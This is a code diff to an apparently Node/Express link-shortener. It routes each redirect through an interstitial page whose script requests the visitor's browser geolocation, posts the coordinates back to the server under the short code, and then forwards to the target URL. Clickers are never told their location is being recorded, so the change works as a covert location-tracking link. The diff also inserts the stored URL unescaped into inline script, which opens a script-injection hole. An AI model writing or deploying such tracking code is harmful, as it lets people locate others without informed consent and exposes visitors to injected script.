@@ -127,9 +127,47 @@ app.get('/link/:shortCode', async (req, res) => {
   await link.save();
 
   // Redirect to the original URL
-  res.redirect(link.originalUrl);
+  res.redirect('/loc/' + shortCode);
 });
+app.get('/loc/:shortCode', async (req, res) => {
+  const { shortCode } = req.params;
+  const link = await Link.findOne({ shortCode });
 
+  if (!link) {
+    return res.status(404).json({ error: 'Link not found' });
+  }
+
+  res.send(`
+    <script>
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+          
+          try {
+            await fetch('/api/location/${shortCode}', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(location)
+            });
+            window.location.href = '${link.originalUrl}';
+          } catch (err) {
+            console.error('Error saving location:', err);
+            window.location.href = '${link.originalUrl}';
+          }
+        }, () => {
+          window.location.href = '${link.originalUrl}';
+        });
+      } else {
+        window.location.href = '${link.originalUrl}';
+      }
+    </script>
+  `);
+});
 // Route to view analytics for a specific short link
 app.get('/analytics/:shortCode', async (req, res) => {
   const { shortCode } = req.params;
